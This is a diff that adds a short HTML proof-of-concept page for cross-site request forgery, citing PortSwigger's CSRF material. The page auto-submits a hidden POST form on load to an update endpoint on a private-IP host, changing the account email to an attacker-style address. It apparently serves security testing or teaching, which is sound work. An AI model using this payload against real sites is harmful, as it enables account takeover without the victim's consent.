@@ -1,0 +1,20 @@
+<html>
+    <head>
+        <title>Automatic Form Post</title>
+    </head>
+
+    <body>
+        <p>This should automatically redirect...</p>
+
+        <!--
+            From: https://portswigger.net/web-security/csrf
+        -->
+        <form action="https://172.22.227.209:8443/update" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
